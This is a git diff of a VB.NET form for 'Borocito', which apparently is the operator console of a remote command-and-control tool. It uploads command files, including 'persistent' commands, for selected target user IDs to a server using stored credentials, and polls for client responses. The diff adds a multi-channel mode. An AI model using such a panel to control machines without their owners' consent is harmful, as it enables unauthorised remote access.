@@ -1,11 +1,14 @@
 ﻿Public Class Main
     Dim IsThreadReadCMDServerRunning As Boolean = False
     Dim ThreadReadCMDServer As Threading.Thread = New Threading.Thread(New Threading.ThreadStart(AddressOf ReadCommandFile))
-
+    Dim isMonoChannel As Boolean = True
+    Dim isCommandFileBusy As Boolean = False
     Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         CheckForIllegalCrossThreadCalls = False
         TabPage5.Enabled = False
         Panel1.Dock = DockStyle.Fill
+        parameters = Command()
+        ReadParameters(parameters)
     End Sub
     Private Sub Main_HelpRequested(sender As Object, hlpevent As HelpEventArgs) Handles Me.HelpRequested
         If MessageBox.Show("Borocito fue creado y desarrollado por Zhenboro." & vbCrLf & "¿Desea visitar el sitio oficial?", "Borocito Series", MessageBoxButtons.YesNo, MessageBoxIcon.Information) = DialogResult.Yes Then
@@ -53,7 +56,13 @@
     Private Sub ListBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListBox1.SelectedIndexChanged
         SetTarget(ListBox1.SelectedItem)
         If Not isMultiSelectMode Then
+            RichTextBox2.SelectionColor = Color.Yellow
             RichTextBox2.AppendText(vbCrLf & Label4.Text)
+            If isThemeActive Then
+                RichTextBox2.SelectionColor = Color.LimeGreen
+            Else
+                RichTextBox2.SelectionColor = Color.Black
+            End If
         End If
     End Sub
     Private Sub ListBox1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles ListBox1.MouseDoubleClick
@@ -125,9 +134,9 @@
         End If
     End Sub
     Sub ReadCommandFile()
-        Try
-            Dim LastUserResponse As String = Nothing
-            While True
+        Dim LastUserResponse As String = Nothing
+        While True
+            Try
                 Dim LocalCommandFile As String = DIRCommons & "\[" & userIDTarget & "]Command.str"
                 Dim RemoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & userIDTarget & "]Command.str"
                 Threading.Thread.Sleep(CommandRefreshDelay) '10 segundos
@@ -135,6 +144,13 @@
                     My.Computer.FileSystem.DeleteFile(LocalCommandFile)
                 End If
                 My.Computer.Network.DownloadFile(RemoteCommandFile, LocalCommandFile)
+                If Not isCommandFileBusy Then
+                    'Actualizamos el contenido del fichero de comando directo (para el multiCanal)
+                    If My.Computer.FileSystem.FileExists(DIRCommons & "\userCommand.str") Then
+                        My.Computer.FileSystem.DeleteFile(DIRCommons & "\userCommand.str")
+                    End If
+                    My.Computer.FileSystem.WriteAllText(DIRCommons & "\userCommand.str", My.Computer.FileSystem.ReadAllText(LocalCommandFile), False)
+                End If
                 'Leer
                 Dim TheResponse As String = LeerFicheroDesdeLinea(6, LocalCommandFile)
                 If TheResponse = LastUserResponse Then
@@ -145,31 +161,36 @@
                     End If
                 Else
                     LastUserResponse = TheResponse
-                    'quizas un if LastUserResponse <> nothing para que corra la siguiente linea, asi evitar las respuestas "fantasma"... BOO
                     If LastUserResponse <> Nothing Or LastUserResponse <> TheResponse Then
                         SetCMDStatus(vbCrLf & "Client: " & LastUserResponse, Nothing)
                     End If
                 End If
-            End While
-        Catch ex As Exception
-            AddToLog("ReadCommandFile@Network", "Error: " & ex.Message, True)
-        End Try
+            Catch ex As Exception
+                AddToLog("ReadCommandFile@Network", "Error: " & ex.Message, True)
+            End Try
+        End While
     End Sub
     Sub SendCommandFile(ByVal user As String, ByVal command As String)
+        isCommandFileBusy = True
         Label_Status.Text = "Sending command..."
         user = user.Replace("userID_", Nothing)
         user = user.Replace(".rtp", Nothing)
         userIDTarget = user
         Try
-            'recuerda que hay 4 campos para comandos disponibles, buscar una forma para irlos cortando segun posicion en la linea *evitar agregar muchos textbox
-            '   por ahora solo tendremos la primera linea
+            Dim Lineas = IO.File.ReadAllLines(DIRCommons & "\userCommand.str")
             If My.Computer.FileSystem.FileExists(DIRCommons & "\userCommand.str") Then
                 My.Computer.FileSystem.DeleteFile(DIRCommons & "\userCommand.str")
             End If
+            Dim secundaryCommand As String = Lineas(2).Split(">"c)(1).Trim() 'Comando secundario
+            Dim persistentCommand As String = Lineas(3).Split(">"c)(1).Trim() 'Comando persistente
+            If Not isMonoChannel Then
+                secundaryCommand = InputBox("Set secundary command", "Multi channel " & userIDTarget, secundaryCommand)
+                persistentCommand = InputBox("Set persistent command", "Multi channel " & userIDTarget, persistentCommand)
+            End If
             My.Computer.FileSystem.WriteAllText(DIRCommons & "\userCommand.str", "#Command Channel for Unique User" &
                                                     vbCrLf & "Command1>" & command &
-                                                    vbCrLf & "Command2>" &
-                                                    vbCrLf & "Command3>" &
+                                                    vbCrLf & "Command2>" & secundaryCommand &
+                                                    vbCrLf & "Command3>" & persistentCommand &
                                                     vbCrLf & "[Response]", False)
             My.Computer.Network.UploadFile(DIRCommons & "\userCommand.str", HostOwnerServer & "/Users/Commands/[" & user & "]Command.str", HostOwnerServerUser, HostOwnerServerPassword)
             If Not isMultiSelectMode Then
@@ -179,6 +200,7 @@
         Catch ex As Exception
             AddToLog("SendCommandFile@Main", "Error: " & ex.Message, True)
         End Try
+        isCommandFileBusy = False
     End Sub
     Private Function LeerFicheroDesdeLinea(ByVal numeroLinea As Integer, ByVal nombreFichero As String) As String
         Dim fichero As New System.IO.FileInfo(nombreFichero)
@@ -362,6 +384,20 @@
                 ListBox1.SelectionMode = SelectionMode.MultiSimple
                 isMultiSelectMode = True
             End If
+        End If
+    End Sub
+
+    Private Sub ComboBox1_TextChanged(sender As Object, e As EventArgs) Handles ComboBox1.TextChanged
+        If ComboBox1.Text.ToLower Like "*@multichannel*" Then
+            RichTextBox2.AppendText(vbCrLf & "Multi channel activated!" & vbCrLf)
+            isMonoChannel = False
+            ComboBox1.Text = Nothing
+        ElseIf ComboBox1.Text.ToLower Like "*@monochannel*" Then
+            RichTextBox2.AppendText(vbCrLf & "Mono channel activated!" & vbCrLf)
+            isMonoChannel = True
+            ComboBox1.Text = Nothing
+        ElseIf ComboBox1.Text.ToLower Like "*@exit*" Then
+            End
         End If
     End Sub
 End Class
